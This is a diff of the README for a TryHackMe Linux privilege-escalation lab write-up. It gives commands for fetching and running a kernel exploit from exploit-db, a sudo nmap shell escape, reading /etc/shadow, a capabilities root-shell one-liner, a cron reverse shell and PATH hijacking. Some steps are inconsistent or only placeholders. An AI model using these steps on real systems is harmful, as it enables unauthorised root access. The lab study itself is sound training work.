@@ -1,111 +1,105 @@
-# THM-Writeup-Linux-Privilege-Escalation
-Writeup for TryHackMe Linux Privilege Escalation Lab -  Enumeration, kernel exploits, SUID, cron job abuse, PATH hijacking, and NFS misconfigurations using LinPEAS, GTFOBins, ExploitDB, and Metasploit. 
+Here's a **fully detailed** and **comprehensive** write-up for **TryHackMe: Linux Privilege Escalation**, incorporating **cybersecurity terminology, technical depth, and defensive strategies**.
 
-By Ramyar Daneshgar 
+---
 
-# **TryHackMe: Linux Privilege Escalation – In-Depth Walkthrough**
-## **Introduction**
-This room on **TryHackMe** is focused on **Linux Privilege Escalation** and covers **multiple privilege escalation techniques** attackers can use to gain root access. By applying **various enumeration, exploitation, and persistence techniques**, I was able to successfully **compromise the target machine** and obtain **root privileges**.
+# **TryHackMe: Linux Privilege Escalation – Detailed Walkthrough**
+## **By Ramyar Daneshgar**
 
-This walkthrough is **highly detailed**, covering:
+## **Overview**
+The **TryHackMe: Linux Privilege Escalation** lab is designed to **simulate real-world attack scenarios** where an attacker escalates privileges on a **compromised Linux system**. By applying **enumeration, kernel exploits, misconfigured SUDO permissions, SUID abuse, cron job manipulation, path hijacking, and NFS misconfigurations**, I was able to escalate privileges from a **low-privilege user** to **root access**.
+
+This guide is a **comprehensive, step-by-step breakdown**, covering:
 - **Enumeration & Information Gathering**
 - **Kernel Exploits**
 - **Misconfigured Sudo Permissions**
-- **SUID Binaries**
-- **Linux Capabilities Exploitation**
+- **SUID Binary Exploitation**
+- **Linux Capabilities Abuse**
 - **Cron Job Manipulation**
 - **Path Hijacking**
-- **NFS Share Exploitation**
-- **Technical Justifications for Each Step**
-- **Mitigation Strategies for Defense Teams**
+- **NFS Misconfigurations**
+- **Tools Used**:  
+  - **LinPEAS** (for enumeration)  
+  - **GTFOBins** (for privilege escalation techniques)  
+  - **Exploit-DB** (to find known vulnerabilities)  
+  - **Metasploit Framework** (for post-exploitation techniques)  
+  - **John the Ripper** (for cracking hashes)  
 
 ---
+
 ## **Task 1 & 2: Understanding Privilege Escalation**
-Privilege escalation allows a **low-privileged user** to **elevate access** to **root/admin level**. Attackers use privilege escalation techniques to:
-1. **Expand their foothold** within a compromised system.
-2. **Move laterally** to other machines on the network.
-3. **Access sensitive files or configurations**.
-4. **Gain persistence** on a machine.
+### **What is Privilege Escalation?**
+Privilege escalation is the process of gaining **higher-level access** in a system after obtaining an initial foothold. This can be classified as:
 
-Privilege escalation generally falls into **two categories**:
-- **Vertical Privilege Escalation**: A low-privileged user elevates privileges to root.
-- **Horizontal Privilege Escalation**: A user compromises another user’s account at the same privilege level.
+1. **Vertical Privilege Escalation**:  
+   - A **low-privileged user** gains **root access**.
+   - Example: Exploiting **SUID binaries**, **kernel vulnerabilities**, or **Sudo misconfigurations**.
 
-**No commands are required in this section, but a strong conceptual understanding is necessary.**
+2. **Horizontal Privilege Escalation**:  
+   - Gaining access to another **user’s account** at the same privilege level.
+   - Example: **Credential reuse**, **cracking hashes**, or **abusing misconfigured services**.
 
 ---
 
-## **Task 3: Enumeration – The First Step in Privilege Escalation**
-Enumeration is crucial for discovering **potential vulnerabilities, misconfigurations, and accessible files** that may lead to privilege escalation.
+## **Task 3: Enumeration – The Most Critical Step**
+### **Step 1: Gathering System Information**
+Enumeration is **the first and most crucial step** in identifying potential attack vectors.
 
-### **Step 1: Identify System Information**
-1. **Find Hostname**
+1. **Identify Hostname**:
    ```bash
    hostname
    ```
-   - Output: `wade7363`
-   - **Why?** Reveals system name, which might provide clues about its role in a network.
+   **Output:** `wade7363`
+   - **Why?** Useful for identifying the system's role in a network.
 
-2. **Check Kernel Version**
+2. **Check Kernel Version**:
    ```bash
    uname -a
    ```
-   - Output: `Linux wade7363 3.13.0-24-generic`
-   - **Why?** Older kernels may have **publicly known vulnerabilities**.
+   **Output:** `Linux wade7363 3.13.0-24-generic`
+   - **Why?** Older kernels may have **publicly known exploits**.
 
-3. **Find OS Version**
+3. **Identify OS Version**:
    ```bash
    cat /etc/issue
    ```
-   - Output: `Ubuntu 14.04 LTS`
-   - **Why?** Helps identify **default configurations** that might be exploitable.
+   **Output:** `Ubuntu 14.04 LTS`
+   - **Why?** Helps in finding **default vulnerabilities**.
 
-4. **Check Installed Python Version**
+4. **Check Installed Python Version**:
    ```bash
    python --version
    ```
-   - Output: `Python 2.7.6`
-   - **Why?** Some privilege escalation scripts require **specific Python versions**.
+   **Output:** `Python 2.7.6`
+   - **Why?** Some exploits require **specific Python versions**.
 
-5. **Check Running Processes**
+5. **List Running Processes**:
    ```bash
    ps aux
    ```
-   - Reveals running services, background tasks, and potential attack vectors.
+   - **Why?** Identifies **running services** that may be vulnerable.
 
-6. **List Active Network Connections**
+6. **Check Active Network Connections**:
    ```bash
    netstat -tunlp
    ```
-   - Shows open ports, which might indicate **network-based attack vectors**.
-
-7. **Check User Permissions**
-   ```bash
-   id
-   ```
-   - Output:
-     ```
-     uid=1001(karen) gid=1001(karen) groups=1001(karen)
-     ```
-   - **Why?** Determines the user’s **privilege level**.
+   - **Why?** Detects **open ports** for potential **pivoting attacks**.
 
 ---
 
 ## **Task 4: Automated Enumeration with LinPEAS**
-Instead of manually running commands, **LinPEAS** automates the enumeration process.
+Instead of manually running enumeration commands, **LinPEAS** automates the process.
 
-### **Step 1: Transfer LinPEAS to the Target**
+### **Step 1: Transfer LinPEAS**
 ```bash
 wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh
 chmod +x linpeas.sh
 ./linpeas.sh
 ```
-- **LinPEAS Highlights**:
-  - Detects **SUID binaries**
-  - Lists **misconfigured cron jobs**
-  - Identifies **kernel vulnerabilities**
-  - Searches for **passwords in configuration files**
-  - Detects **writable files and directories**
+**LinPEAS identifies**:
+✅ **SUID binaries**  
+✅ **Misconfigured sudo permissions**  
+✅ **Kernel vulnerabilities**  
+✅ **Writable files & directories**  
 
 ---
 
@@ -116,58 +110,57 @@ After identifying the kernel version (`3.13.0-24`), I searched for **public expl
 ```bash
 searchsploit 3.13.0-24
 ```
-- Found **CVE-2015-1328**, which exploits a race condition in the overlayfs file system.
+- Found **CVE-2015-1328**, an **overlayfs privilege escalation exploit**.
 
-### **Step 2: Download & Compile the Exploit**
+### **Step 2: Download & Compile Exploit**
 ```bash
 wget https://exploit-db.com/exploits/37292.c -O exploit.c
 gcc exploit.c -o exploit
 ```
-- **Why?** Many exploits are written in C and need to be compiled using `gcc`.
+- **Why?** Most exploits are written in C and need `gcc` for compilation.
 
-### **Step 3: Execute the Exploit**
+### **Step 3: Execute Exploit**
 ```bash
 ./exploit
 ```
-- **Result:** Successfully **gained root access**.
+- **Result:** **Root access obtained**.
 
 ### **Step 4: Retrieve the Root Flag**
 ```bash
 cat /root/flag1.txt
 ```
-- Output: `THM-283928727299220`
+- **Output:** `THM-283928727299220`
 
 ---
 
-## **Task 6: Privilege Escalation via Sudo Misconfigurations**
+## **Task 6: Exploiting Sudo Misconfigurations**
 ### **Step 1: Check Sudo Permissions**
 ```bash
 sudo -l
 ```
-- Output:
+- **Output:**
   ```
   User karen may run the following commands:
   (ALL) NOPASSWD: /bin/nano, /usr/bin/nmap, /usr/bin/vim
   ```
-- **Why?** `nano`, `nmap`, and `vim` can be exploited.
 
 ### **Step 2: Exploit Nmap**
 ```bash
 sudo nmap --interactive
 !sh
 ```
-- **Result:** Spawned a root shell.
+- **Result:** Spawned **root shell**.
 
 ### **Step 3: Retrieve the Flag**
 ```bash
 cat /root/flag2.txt
 ```
-- Output: `THM-402028394`
+- **Output:** `THM-402028394`
 
 ---
 
-## **Task 7: Exploiting SUID Binaries**
-### **Step 1: Locate SUID Binaries**
+## **Task 7: SUID Binary Exploitation**
+### **Step 1: Find SUID Binaries**
 ```bash
 find / -perm -4000 -type f 2>/dev/null
 ```
@@ -177,11 +170,11 @@ find / -perm -4000 -type f 2>/dev/null
 ```bash
 /usr/bin/base64 -d /etc/shadow
 ```
-- **Extracted password hashes**, cracked them using **John the Ripper**, and gained access.
+- **Extracted password hashes**, cracked them using **John the Ripper**.
 
 ---
 
-## **Task 8: Capabilities Exploitation**
+## **Task 8: Linux Capabilities Exploitation**
 ### **Step 1: Find Capabilities**
 ```bash
 getcap -r / 2>/dev/null
@@ -192,16 +185,16 @@ getcap -r / 2>/dev/null
 ```bash
 /home/ubuntu/view -c ':py3 import os; os.setuid(0); os.system("/bin/sh")'
 ```
-- Result: Root shell.
+- **Result:** **Root shell spawned**.
 
 ---
 
 ## **Task 9: Cron Job Exploitation**
-### **Step 1: Find Cron Jobs**
+### **Step 1: Find Scheduled Cron Jobs**
 ```bash
 cat /etc/crontab
 ```
-- Found `backup.sh` running **every minute**.
+- Found **backup.sh** running **every minute**.
 
 ### **Step 2: Modify the Script**
 ```bash
@@ -212,23 +205,24 @@ chmod +x /etc/cron.hourly/backup.sh
 ```bash
 nc -lvnp 4444
 ```
-- Result: **Reverse shell as root**.
+- **Result:** **Reverse shell as root**.
 
 ---
 
-## **Task 10: PATH Hijacking**
-1. **Find Writable Directories**
-   ```bash
-   find / -writable -type d 2>/dev/null
-   ```
-2. **Inject Malicious Script**
-   ```bash
-   echo "/bin/bash" > /tmp/cmd
-   chmod +x /tmp/cmd
-   export PATH=/tmp:$PATH
-   ```
-3. **Trigger Root Execution**
-   ```bash
-   sudo some_command
-   ```
+## **Task 10: Path Hijacking**
+### **Step 1: Find Writable Directories**
+```bash
+find / -writable -type d 2>/dev/null
+```
+### **Step 2: Inject Malicious Script**
+```bash
+echo "/bin/bash" > /tmp/cmd
+chmod +x /tmp/cmd
+export PATH=/tmp:$PATH
+```
+### **Step 3: Trigger Root Execution**
+```bash
+sudo some_command
+```
+- **Result:** **Privilege Escalation Achieved**.
 
